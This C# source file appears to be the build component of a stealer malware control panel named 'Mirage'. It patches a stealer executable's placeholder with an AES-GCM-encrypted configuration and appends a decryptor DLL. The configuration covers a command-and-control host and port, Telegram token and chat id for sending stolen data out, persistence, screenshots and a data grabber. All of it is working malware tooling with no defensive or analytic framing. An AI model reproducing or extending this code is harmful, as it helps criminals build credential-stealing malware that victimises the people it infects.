using System.Security.Cryptography;
using System.Text;
using System.Text.Json;

namespace Mirage.Panel.Services;

public class BuildService
{
    private const string ConfigSignature = "MIRAGECFG";
    private const int KeySize = 32;
    private const int NonceSize = 12;
    private const int TagSize = 16;

    public byte[] Build(byte[] stealerExe, byte[]? decryptorDll, BuildConfig config)
    {
        var result = new byte[stealerExe.Length];
        Array.Copy(stealerExe, result, stealerExe.Length);

        var sigIdx = FindSignature(result, ConfigSignature);
        if (sigIdx < 0) throw new InvalidOperationException("MIRAGECFG signature not found");

        var encrypted = AesGcmEncryptConfig(config);

        var totalLen = encrypted.Length;
        if (sigIdx + totalLen > result.Length)
            throw new InvalidOperationException($"Config too large for placeholder space ({totalLen} > {result.Length - sigIdx})");

        Array.Copy(encrypted, 0, result, sigIdx, totalLen);

        if (decryptorDll != null && decryptorDll.Length > 0)
        {
            var overlay = new byte[result.Length + decryptorDll.Length];
            Array.Copy(result, overlay, result.Length);
            Array.Copy(decryptorDll, 0, overlay, result.Length, decryptorDll.Length);
            return overlay;
        }

        return result;
    }

    private static byte[] AesGcmEncryptConfig(BuildConfig config)
    {
        var json = JsonSerializer.Serialize(config);
        var plaintext = Encoding.UTF8.GetBytes(json);

        var key = RandomNumberGenerator.GetBytes(32);
        var nonce = RandomNumberGenerator.GetBytes(12);
        var tag = new byte[16];
        var ciphertext = new byte[plaintext.Length];

        using var aes = new AesGcm(key, TagSize);
        aes.Encrypt(nonce, plaintext, ciphertext, tag);

        // Format: [key:32][nonce:12][tag:16][ciphertext:N]
        var result = new byte[KeySize + NonceSize + TagSize + ciphertext.Length];
        Array.Copy(key, 0, result, 0, KeySize);
        Array.Copy(nonce, 0, result, KeySize, NonceSize);
        Array.Copy(tag, 0, result, KeySize + NonceSize, TagSize);
        Array.Copy(ciphertext, 0, result, KeySize + NonceSize + TagSize, ciphertext.Length);
        return result;
    }

    private static int FindSignature(byte[] data, string sig)
    {
        var sigBytes = Encoding.ASCII.GetBytes(sig);
        for (int i = 0; i <= data.Length - sigBytes.Length; i++)
        {
            bool found = true;
            for (int j = 0; j < sigBytes.Length; j++)
                if (data[i + j] != sigBytes[j]) { found = false; break; }
            if (found) return i;
        }
        return -1;
    }
}

public record BuildConfig
{
    public string C2Host { get; init; } = "127.0.0.1";
    public int C2Port { get; init; } = 8443;
    public string TelegramToken { get; init; } = "";
    public string TelegramChatId { get; init; } = "";
    public bool EnablePersistence { get; init; }
    public bool EnableScreenshot { get; init; } = true;
    public bool EnableGrabber { get; init; } = true;
}
